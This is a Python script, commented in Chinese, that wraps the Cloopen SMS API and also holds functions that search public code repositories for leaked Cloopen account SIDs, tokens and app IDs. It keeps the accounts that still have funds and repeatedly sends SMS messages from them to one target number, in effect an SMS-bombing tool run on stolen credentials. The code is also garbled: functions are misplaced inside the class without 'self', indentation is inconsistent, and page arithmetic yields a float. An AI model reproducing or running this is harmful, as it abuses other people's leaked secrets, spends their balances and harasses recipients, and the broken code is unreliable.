class Cloopen:
    URL = 'https://app.cloopen.com:8883/2013-12-26'

    def __init__(self, sid, token, appid):
        self.sid = sid
        self.token = token
        self.appid = appid
        self.template_ids = []
        self.balance = 0.0

    def load_valid_template_ids(self):
    	"""加载可用短信模板"""
        if self.template_ids:
            return self.template_ids
        resp = self.query_sms_template('')
        if resp['statusCode'] == '000000':
            self.template_ids = [d['id'] for d in resp['TemplateSMS'] if d['status'] == '1']
            return self.template_ids

    def send_sms(self, recvr, template_id, * datas):
        body = {'to': recvr, 'datas': datas, 'templateId': template_id, 'appId': self.appid}
        return self._send_request("/Accounts/" + self.sid+ "/SMS/TemplateSMS", body=json.dumps(body))

    def query_sms_template(self, template_id):
        """
        查询短信模板
        :param template_id 模板Id，不带此参数查询全部可用模板
        """
        body = {'appId': self.appid, 'templateId': template_id}
        return self._send_request('/Accounts/' + self.sid + '/SMS/QuerySMSTemplate', json.dumps(body))

    def query_account_info(self):
        return self._send_request("/Accounts/" + self.sid + "/AccountInfo")

    def _send_request(self, path, body=None):
        # 生成sig
        ts = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
        signature = self.sid + self.token + ts
        sig = md5(signature.encode('utf-8')).hexdigest().upper()
        # basic auth
        req = Request(Cloopen.URL + path + "?sig=" + sig)
        req.add_header('Authorization', b64encode((self.sid+':'+ts).encode('utf-8')).strip())
        req.add_header('Accept', 'application/json')
        req.add_header('Content-Type', 'application/json;charset=utf-8')
        if body:
            req.data = body.encode('utf-8')
        with urlopen(req) as resp:
            return json.loads(resp.read().decode('utf-8'))

    def __str__(self, *args, **kwargs):
        return 'Account: {sid: %s, token: %s, appid: %s, template_ids: %s, balance: %.2f}' % \
               (self.sid, self.token, self.appid, str(self.template_ids), self.balance)

    def __eq__(self, other):
        if isinstance(other, self.__class__):
            return self.sid == other.sid
        return False

    def __hash__(self, *args, **kwargs):
        return hash(self.sid)

    def search_all(keyword, max_page=10, greenlet_count=3):
        """
        通过协程并发搜索
        :param max_page 最大页数
        :param greenlet_count 协程数量
        """
        paging = client.search_code(keyword)
        total_page = min(max_page, paging.totalCount / 20)
        tasks = Queue()
        for i in range(1, total_page + 1):
            tasks.put(i)
        accounts = set()

        def _search():
            while not tasks.empty():
                try:
                    page_no = tasks.get()
                    logging.info('正在搜索第%d页' % page_no)
                    contents = map(lambda x: x.decoded_content.decode('utf-8'), paging.get_page(page_no))
                    accounts.update({Cloopen(*p) for p in map(extract, contents) if p})
                except Exception as err:
                    logging.error(err)
                    break

        import gevent
        gevent.joinall([gevent.spawn(_search) for _ in range(greenlet_count)])
        return accounts

    def extract(content):
        """
        从搜索结果中抽取字段
        """

        # 提取主要字段
        def search_field(keyword_and_pattern):
            keyword, pattern = keyword_and_pattern
            for line in content.split('\n'):
                if re.search(keyword, line, re.IGNORECASE):
                    match = re.search(pattern, line)
                    if match:
                        return match.group(0)

        account_sid, account_token, appid = map(search_field, [('sid', '[a-z0-9]{32}'),
                                                               ('token', '[a-z0-9]{32}'),
                                                               ('app.?id', '[a-z0-9]{32}')])
        if all([account_sid, account_token, appid]):
            return account_sid, account_token, appid

        def collect_accounts():
            for account in search_all('app.cloopen.com', max_page=6):
                info = account.query_account_info()
                if info['statusCode'] == '000000':
                    balance = float(info['Account']['balance'])
                    if balance > 0:
                        account.balance = balance
                        if account.load_valid_template_ids():
                            yield account

    def run(account: Cloopen, recvr):
        from random import choice
        while True:
            resp = account.send_sms(recvr, choice(account.template_ids), '0198', '1230', '1993', '1293')
            if resp['statusCode'] == '000000':
                global sent_count
                sent_count += 1
                # cloopen规定同一个手机号发送间隔为30s
                if sent_count > MAX_SEND:
                    break
                gevent.sleep(30)
            else:
                logging.error('协程: [' + hex(id(gevent.getcurrent())) + "]发送消息失败: " + resp['statusMsg'])
                break